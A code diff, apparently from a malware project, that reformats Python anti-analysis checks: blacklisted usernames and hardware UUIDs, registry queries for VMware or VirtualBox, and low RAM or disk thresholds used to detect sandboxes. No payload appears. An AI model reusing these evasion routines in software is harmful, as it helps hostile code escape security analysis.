@@ -5,6 +5,7 @@ import requests
 import winreg
 import psutil
 
+
 def user_check():
     USERS = [
         "Admin",
@@ -188,24 +189,17 @@ def hwid_check():
         "07AF2042-392C-229F-8491-455123CC85FB",
         "4EDF3342-E7A2-5776-4AE5-57531F471D56",
         "032E02B4-0499-05C3-0806-3C0700080009",
-        "11111111-2222-3333-4444-555555555555"
+        "11111111-2222-3333-4444-555555555555",
     ]
 
     try:
-        HWID = (
-            subprocess.check_output(
-                r"wmic csproduct get uuid", creationflags=0x08000000
-            )
-            .decode()
-            .split("\n")[1]
-            .strip()
-        )
+        HWID = subprocess.check_output(r"wmic csproduct get uuid", creationflags=0x08000000).decode().split("\n")[1].strip()
 
         if HWID in HWIDS:
             return True
     except Exception:
         pass
-    
+
 
 def ip_check():
     try:
@@ -284,17 +278,11 @@ def ip_check():
 
 
 def registry_check():
-    reg1 = os.system(
-        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
-    )
-    reg2 = os.system(
-        "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
-    )
+    reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
+    reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
     if reg1 != 1 and reg2 != 1:
         return True
-    handle = winreg.OpenKey(
-        winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
-    )
+    handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
     try:
         reg_val = winreg.QueryValueEx(handle, "0")[0]
         if ("VMware" or "VBOX") in reg_val:
@@ -314,8 +302,8 @@ def dll_check():
 
 def specs_check():
     try:
-        RAM = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
-        DISK = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
+        RAM = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
+        DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
         if int(RAM) <= 2:
             return True
         if int(DISK) <= 50:
